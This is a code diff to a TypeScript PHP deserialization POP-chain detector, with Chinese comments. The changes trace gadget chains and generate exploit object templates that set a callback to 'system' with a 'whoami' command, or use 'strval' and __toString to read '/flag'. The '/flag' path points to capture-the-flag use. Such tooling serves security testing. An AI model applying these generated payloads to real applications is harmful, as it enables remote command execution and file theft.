@@ -1128,13 +1128,40 @@ export class POPChainDetector {
         return what?.kind === 'variable' && what?.name === 'this';
     }
 
+    /**
+     * 检测是否是动态函数调用: ($this->prop)() 或真正的属性函数调用
+     * 注意：$this->method() 不是动态调用（method是静态标识符）
+     */
     private isThisPropertyCall(node: any): boolean {
         if (!node) return false;
-        // ($this->prop) 包裹在括号中
+        
+        // ($this->prop)() - 包裹在括号中，这是动态函数调用
         if (node.kind === 'parenthesis') {
             return this.isThisProperty(node.inner);
         }
-        return this.isThisProperty(node);
+        
+        // $this->prop 直接作为函数调用
+        // 关键区分：检查 offset 是 identifier（静态方法名）还是 variable（动态）
+        if (node.kind === 'propertylookup') {
+            const what = node.what;
+            const offset = node.offset;
+            
+            // 必须是 $this
+            if (what?.kind !== 'variable' || what?.name !== 'this') {
+                return false;
+            }
+            
+            // 如果 offset 是 identifier，这是静态方法调用 $this->method()，不是动态
+            // 如果 offset 是 variable，这是动态方法调用 $this->$method()
+            if (offset?.kind === 'identifier') {
+                return false;  // $this->method() - 不是动态函数调用
+            }
+            
+            // $this->$prop() 或其他动态情况
+            return true;
+        }
+        
+        return false;
     }
 
     private getPropertyFromNode(node: any): string {
@@ -1603,6 +1630,31 @@ export class POPChainDetector {
 
         // 分析触发器，找下一跳
         for (const trigger of gadget.triggers) {
+            // === 处理 method_call: 调用本类的其他方法 ===
+            if (trigger.type === 'method_call' && trigger.targetMethod) {
+                // 找本类的目标方法
+                const sameClassGadget = allGadgets.find(g => 
+                    g.className === gadget.className && g.methodName === trigger.targetMethod
+                );
+                
+                if (sameClassGadget) {
+                    // 递归处理该方法的触发器（把它的触发器合并到当前gadget）
+                    for (const innerTrigger of sameClassGadget.triggers) {
+                        if (innerTrigger.type === 'object_method' && innerTrigger.targetMethod) {
+                            // 找有这个方法的其他类
+                            const targetGadget = allGadgets.find(g => 
+                                g.methodName === innerTrigger.targetMethod && g.className !== gadget.className
+                            );
+                            
+                            if (targetGadget && targetGadget.dangerousCalls.length > 0) {
+                                steps.push(this.createChainStep(targetGadget, innerTrigger));
+                            }
+                        }
+                    }
+                }
+            }
+
+            // === 处理 object_method: 调用其他对象的方法 ===
             if (trigger.type === 'object_method' && trigger.targetMethod) {
                 // 找有这个方法的类
                 const targetGadget = allGadgets.find(g => 
@@ -1821,13 +1873,178 @@ export class POPChainDetector {
         addClassWithParent(entry.className);
         steps.forEach(s => addClassWithParent(s.className));
         
-        // 收集需要的对象变量和入口属性（这里会添加更多类到 neededClasses）
+        // 收集需要的对象变量和入口属性
         const objectVars: Array<{varName: string, className: string, props: Array<{name: string, value: string, comment: string}>}> = [];
         const entryProps: Array<{name: string, value: string, comment: string}> = [];
         
-        // 分析入口 gadget 的调用模式
+        // === 新逻辑：分析整个链路，找出需要的属性设置 ===
+        
+        // 1. 分析入口类调用的方法，找到对象方法调用
+        const entryClassInfo = this.classMap.get(entry.className);
         const entryGadget = this.gadgetMap.get(`${entry.className}::${entry.methodName}`);
+        
+        // 找入口类的 method_call 触发的方法
+        let mainMethodGadget = entryGadget;
         if (entryGadget) {
+            for (const trigger of entryGadget.triggers) {
+                if (trigger.type === 'method_call' && trigger.targetMethod) {
+                    const sameClassGadget = this.gadgetMap.get(`${entry.className}::${trigger.targetMethod}`);
+                    if (sameClassGadget) {
+                        mainMethodGadget = sameClassGadget;
+                        break;
+                    }
+                }
+            }
+        }
+
+        // 2. 分析主方法的 object_method 调用
+        if (mainMethodGadget) {
+            for (const prop of mainMethodGadget.properties) {
+                if (prop.type === 'object_call' && prop.details) {
+                    const objPropName = prop.name;  // e.g., 'processor'
+                    const calledMethod = prop.details.calledMethod;  // e.g., 'transform'
+                    const argProps = prop.details.argumentProps || [];  // e.g., ['data']
+                    
+                    // 找有这个方法的 gadget
+                    const targetGadget = allGadgets.find(g => 
+                        g.methodName === calledMethod && g.className !== entry.className
+                    );
+                    
+                    if (targetGadget) {
+                        addClassWithParent(targetGadget.className);
+                        const targetProps: Array<{name: string, value: string, comment: string}> = [];
+                        
+                        // 分析目标方法的危险调用
+                        for (const dc of targetGadget.dangerousCalls) {
+                            // call_user_func($this->callback, $data)
+                            if (dc.functionName === 'call_user_func') {
+                                // 第一个参数通常是函数名属性
+                                if (dc.arguments.length > 0 && dc.arguments[0].startsWith('$this->')) {
+                                    const callbackProp = dc.arguments[0].replace('$this->', '');
+                                    
+                                    // 检查是否有 __toString 可以触发文件读取
+                                    // 直接检查：__toString 有 file_get_contents
+                                    // 间接检查：__toString 调用的方法有 file_get_contents
+                                    let toStringGadget = allGadgets.find(g => 
+                                        g.methodName === '__toString' && 
+                                        g.dangerousCalls.some(d => d.functionName.includes('file_get_contents'))
+                                    );
+                                    
+                                    // 间接检查：__toString 调用其他方法
+                                    if (!toStringGadget) {
+                                        toStringGadget = allGadgets.find(g => {
+                                            if (g.methodName !== '__toString') return false;
+                                            // 检查 __toString 调用的方法
+                                            for (const trigger of g.triggers) {
+                                                if (trigger.type === 'method_call' && trigger.targetMethod) {
+                                                    // 查找同类的目标方法
+                                                    const calledGadget = allGadgets.find(cg => 
+                                                        cg.className === g.className && 
+                                                        cg.methodName === trigger.targetMethod
+                                                    );
+                                                    if (calledGadget?.dangerousCalls.some(d => 
+                                                        d.functionName.includes('file_get_contents') ||
+                                                        d.functionName.includes('file') ||
+                                                        d.functionName.includes('readfile')
+                                                    )) {
+                                                        return true;
+                                                    }
+                                                }
+                                            }
+                                            return false;
+                                        });
+                                    }
+                                    
+                                    if (toStringGadget) {
+                                        // 使用 strval 触发 __toString
+                                        targetProps.push({
+                                            name: callbackProp,
+                                            value: '"strval"',
+                                            comment: '使用 strval 触发 __toString'
+                                        });
+                                        
+                                        addClassWithParent(toStringGadget.className);
+                                        
+                                        // FileReader 需要 filename
+                                        const fileReaderProps: Array<{name: string, value: string, comment: string}> = [];
+                                        const frClassInfo = this.classMap.get(toStringGadget.className);
+                                        if (frClassInfo) {
+                                            for (const frProp of frClassInfo.properties) {
+                                                if (frProp.name === 'filename') {
+                                                    fileReaderProps.push({
+                                                        name: 'filename',
+                                                        value: '"/flag"',
+                                                        comment: '要读取的文件 (改为目标路径)'
+                                                    });
+                                                }
+                                            }
+                                        }
+                                        
+                                        objectVars.push({
+                                            varName: '$fileReader',
+                                            className: toStringGadget.className,
+                                            props: fileReaderProps
+                                        });
+                                        
+                                        // 入口的 data 属性指向 FileReader
+                                        for (const argProp of argProps) {
+                                            entryProps.push({
+                                                name: argProp,
+                                                value: '$fileReader',
+                                                comment: `${toStringGadget.className} 对象 (触发 __toString)`
+                                            });
+                                        }
+                                    } else {
+                                        // 没有 __toString gadget，直接用 system
+                                        targetProps.push({
+                                            name: callbackProp,
+                                            value: '"system"',
+                                            comment: '危险函数名 (可改为 exec, passthru 等)'
+                                        });
+                                        
+                                        // data 参数作为命令
+                                        for (const argProp of argProps) {
+                                            entryProps.push({
+                                                name: argProp,
+                                                value: '"whoami"',
+                                                comment: '命令参数'
+                                            });
+                                        }
+                                    }
+                                }
+                            }
+                            
+                            // 其他危险函数处理
+                            if (dc.isDynamic) {
+                                const match = dc.pattern.match(/\(\$this->(\w+)\)\(/);
+                                if (match && !targetProps.some(p => p.name === match[1])) {
+                                    targetProps.push({
+                                        name: match[1],
+                                        value: '"system"',
+                                        comment: '危险函数名'
+                                    });
+                                }
+                            }
+                        }
+                        
+                        objectVars.push({
+                            varName: '$target',
+                            className: targetGadget.className,
+                            props: targetProps
+                        });
+                        
+                        entryProps.push({
+                            name: objPropName,
+                            value: '$target',
+                            comment: `${targetGadget.className} 对象`
+                        });
+                    }
+                }
+            }
+        }
+        
+        // 分析入口 gadget 的调用模式（保留原有逻辑作为备用）
+        if (entryGadget && entryProps.length === 0) {
             // 分析入口点需要的属性
             for (const prop of entryGadget.properties) {
                 if (prop.type === 'object_call' && prop.details) {
